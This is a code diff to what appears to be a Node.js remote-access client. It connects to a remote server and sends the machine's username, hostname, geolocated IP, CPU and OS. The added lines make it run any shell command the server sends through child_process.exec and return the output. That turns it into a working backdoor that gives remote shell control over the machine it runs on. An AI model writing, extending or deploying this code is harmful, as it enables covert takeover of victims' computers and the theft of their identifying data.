@@ -1,6 +1,7 @@
 import { config } from 'dotenv'
 import { connect, type Socket } from 'node:net'
 import path from 'node:path'
+import { exec } from 'node:child_process'
 import os from 'node:os'
 import { Ip } from './models/Ip'
 
@@ -35,20 +36,48 @@ function connectSocket (): void {
     await ipModel.query()
 
     const data = {
-      ip,
-      username: os.userInfo().username,
-      hostname: os.hostname(),
-      country: ipModel.country,
-      lat: ipModel.lat,
-      lon: ipModel.lon,
-      regionName: ipModel.regionName,
-      cpu: os.arch(),
-      os: os.type()
+      type: 'INFO',
+      data: {
+        ip,
+        username: os.userInfo().username,
+        hostname: os.hostname(),
+        country: ipModel.country,
+        lat: ipModel.lat,
+        lon: ipModel.lon,
+        regionName: ipModel.regionName,
+        cpu: os.arch(),
+        os: os.type()
+      }
     }
 
-    socket.write(Buffer.from(JSON.stringify(data)))
+    socket.write(JSON.stringify(data))
 
     isConnected = true
+  })
+
+  socket.on('data', (event) => {
+    const payload = JSON.parse(event.toString())
+
+    switch (payload.type) {
+      case 'INIT':
+        exec('echo -n $PS1', (_error, stdout) => {
+          socket.write(JSON.stringify({
+            type: 'INIT',
+            data: stdout.toString()
+          }))
+        })
+        break
+      case 'COMMAND':
+        exec(payload.data as string, (_error, stdout) => {
+          socket.write(JSON.stringify({
+            data: stdout,
+            type: 'COMMAND_RESPONSE'
+          }))
+        })
+        break
+      default:
+        break
+    }
   })
 }
 
